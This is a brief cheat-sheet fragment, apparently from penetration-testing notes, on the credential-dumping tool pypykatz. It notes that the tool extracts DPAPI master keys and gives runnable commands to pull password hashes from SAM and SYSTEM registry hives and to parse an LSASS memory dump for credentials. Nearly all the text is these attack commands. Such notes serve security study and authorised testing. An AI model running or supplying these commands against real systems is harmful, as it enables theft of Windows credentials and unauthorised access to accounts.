Can extract #dpapi master keys.
## Extract hash from SAM
```shell-session
$ pypykatz registry --sam sam system
```
## Dump LSASS
```shell-session
$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```